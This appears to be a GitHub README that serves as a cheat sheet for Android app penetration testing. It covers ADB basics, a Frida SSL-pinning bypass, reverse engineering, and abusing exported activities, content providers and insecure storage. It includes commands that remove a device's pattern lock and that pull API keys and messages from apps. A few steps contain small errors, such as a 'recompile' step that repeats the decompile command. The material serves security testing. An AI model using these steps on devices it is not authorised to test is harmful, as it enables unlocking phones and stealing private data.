# Tricks-Pentesting-Android-Applications

## Intro
### Android Architecture
<img  height="650em" src="https://developer.android.com/static/guide/platform/images/android-stack_2x.png" />

### Components
Activities - show screens to the user and allow them to interact with those screens
e.g.  
`am start -n <package_name>/<package_name>.activity`  

Services - tasks that run in the background  
e.g.  
`am startservice -n <package_name>/package_name.service`  

Broadcast Receiver - operating system notifications   
e.g.  
`am broadcast -a android.intent.action.BOOT_COMPLETED`  

Content Provider - share information with other applications  
e.g.  
`content query --uri content://sms/sent`  

### Proccess of Compiling
JVM - Java Virtual Machine    
.java -> javac(compiler)-> .class (bytecode)  

DVM - Dalvik Virtual Machine   
.java -> javac(compiler) -> .class(bytecode) -> dx(compiler) -> .dex(bytecode)  

ART - Android Runtime  
.java -> javac(compiler) -> .class(bytecode) -> dx(compiler) -> .dex(bytecode) -> dex2oat > native binary  

#### Structure of an apk
AndroidManifest.xml - package name, permissions, components  
META-INF - app metadata  
classes.dex - binary dalvik byte code  
res - resources used by the app  
resources.arsc -  

### Basics
#### Android Debug Bridge  
-> Connect ADB  
`adb connect ip:5037`  
`adb shell`  

#### Extract apk / Install apk
-> Access https://play.google.com/store/search?q=<name_app>&c=apps and get package name or url  
https://apkgk.com/APK-Downloader  
https://apps.evozi.com/apk-downloader/  
https://m.apkpure.com/br/  
https://auroraoss.com/  
or  
`adb shell pm list packages -3 (third party packag`  
`adb shell pm path <pÃ¡>`  
`adb pull <package_path>`  
  
## SSL Pinning Bypass - Frida
-> frida-tools  
`pip install frida-tools`  
and/or not  
`pip install frida==15.0.7`  
`frida --version`  
-> frida-server  
https://github.com/frida/frida/releases/  
`adb push frida-server /data/local/tmp/frida-server`  
`adb shell chmod 755 /data/local/tmp/frida-server`  
`adb shell /data/local/tmp/frida-server &`  
-> Certificate Burp Suite  
`adb push cacert.cer /sdcard/Download/`  
-> Configure proxy in settings on mobile  
-> redirect 100% HTTP and HTTP traffic to tunnel ADB  
```
iptables -t nat -A OUTPUT -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080  
iptables -t nat -A OUTPUT -p tcp -m tcp --dport 443 -j REDIRECT --to-ports 8080  
```
`adb reverse tcp:8080 tcp:8080`  
`frida -U -f com.app.okay -l frida_multiple_unpinning.js --no-pause`  

## Crack android pattern lock
```
adb shell
cd /data/data/com.android.providers.settings/databases
sqlite3 settings.db
update system set value=0 where name='lock_pattern_autolock';
update system set value=0 where name='lockscreen.lockedoutpermanently';
.quit
```
```
adb shell rm /data/system/gesture.key
```
## Reverse Engineering
### apk - .dex -> SMALI (Assembler for Android's)
-> baksmali - .dex -> smali
`java -jar baksmali.jar d <app.apk>`
-> apktool decompiling - .dex (Dalvik executable files) -> smali
`apktool d <app.apk>`
-> recompile  
`apktool d <app.apk>`
https://github.com/iBotPeaches/Apktool  
-> Doc - SMALI  
https://github.com/JesusFreke/smali/wiki/TypesMethodsAndFields

jadx .dex files -> Java class  
https://github.com/skylot/jadx

### Vulnerabilities

## Access Control (Exploitation Activity)
```
<activity android:label="@string/apic_label" android:name="<package_name>.APIKeyActivity">
  <intent-filter>
      <action android:name="<package_name>.action.VIEW_KEY" />
      <category android:name="android.intent-category.DEFAULT" />
  </intent-filter>
</activity>
```
e.g.:  
`adb shell am start <package_name>/.APIKeyActivity`  
or  
`adb shell am start <package_name>/.APIKeyActivity -a <package_name>.action.VIEW_KEY`  
e.g.:  
-> Variable validation case in boolean  
if (getIntent().getBooleanExtra(getString(R.string.vld_pin), false)) {  
`cat /res/values/strings.xml | grep vld_pin`  
`<string name="vld_pin">validate_pin</string>`  
`adb shell am start -n <package_name>/.APIKeyActivity -a <package_name>.action.VIEW_KEY --ez validate_pin true`  

## Access Control (Content Provider)
```
<provider android:name="<package_name>.MessagesProvider" android:enabled="true" android:exported="true" android:authorities="<package_name>.provider.messagesprovider" />
```
`grep -R "content://" *`  
MessagesProvider.smali:  const-string v0, "content://<package_name>.provider.messagesprovider/messages"  
`adb shell content query --uri content://<package_name>.provider.messagesprovider/messages`
### Insecure data storage
#### Insecure SQLite data storage
```
sqlite3 data/data/package/databases/ok_db
.tables
select * from <table>
```
#### Insecure shared_prefs data storage
`ls -la /data/data/<package>/shared_prefs/`
#### Insecure data storage (Internal)
`/data/data/package/* or ?`
#### Insecure data storage (External)
```ls -la /mnt/sdcard/```

### Lib ( Dump information about an object file)
-> /data/data/package/lib  
`objdump -s lib.so (.rodata - read only data, constants)`

### Android Debug Mode  
-> DEBUG mode is ON(andoid:debuggable="true") in AndroidManifest.xml

### Automated Tools
#### Mobile Security Framework (MobSF)
https://github.com/MobSF/Mobile-Security-Framework-MobSF  
https://mobsf.live/  
#### Quick Android Review Kit
https://github.com/linkedin/qark
